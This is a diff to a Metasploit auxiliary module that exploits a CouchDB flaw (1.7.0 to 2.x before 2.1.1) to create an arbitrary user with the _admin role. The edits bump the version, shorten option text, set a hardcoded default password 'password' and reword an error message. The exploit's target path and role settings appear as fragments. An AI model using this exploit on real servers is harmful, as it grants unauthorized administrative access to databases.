@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Auxiliary
           Create arbitrary user and assign to admin role on CouchDB version between 1.7.0 and 2.x before 2.1.1
         },
         'Author' => 'Hendrik Van Belleghem - hendrikvb',
-        'Version' => '0.01',
+        'Version' => '0.02',
         'License' => MSF_LICENSE,
         'References' =>
           [
@@ -33,8 +33,8 @@ class MetasploitModule < Msf::Auxiliary
           OptString.new('URIPATH', [true, 'The base path', '/_users/org.couchdb.user:']),
           OptString.new('RPORT', [true, 'CouchDB Port', '5984']),
           OptString.new('RHOST', [true, 'CouchDB Host', '']),
-          OptString.new('USER', [true, 'CouchDB Username you wish to add to database', Rex::Text.rand_text_alpha(12,"")]),
-          OptString.new('PASSWORD', [true, 'CouchDB Password you wish to add to database', Rex::Text.rand_text_alpha(12,"")]),
+          OptString.new('USER', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12,"")]),
+          OptString.new('PASSWORD', [true, 'CouchDB Password', 'password']),#Rex::Text.rand_text_alpha(12,"")]),
           OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])
         ], self.class)
         
@@ -68,7 +68,8 @@ class MetasploitModule < Msf::Auxiliary
       if res && res.code == 200
         print_good("User #{user} created with password #{password}. Connect to http://#{rhost}:#{rport}/_utils/ to login.")
       else
-        print_error("No 200, feeling blue")
+        print_error("Change Failed :(")
       end
     end
   end
+
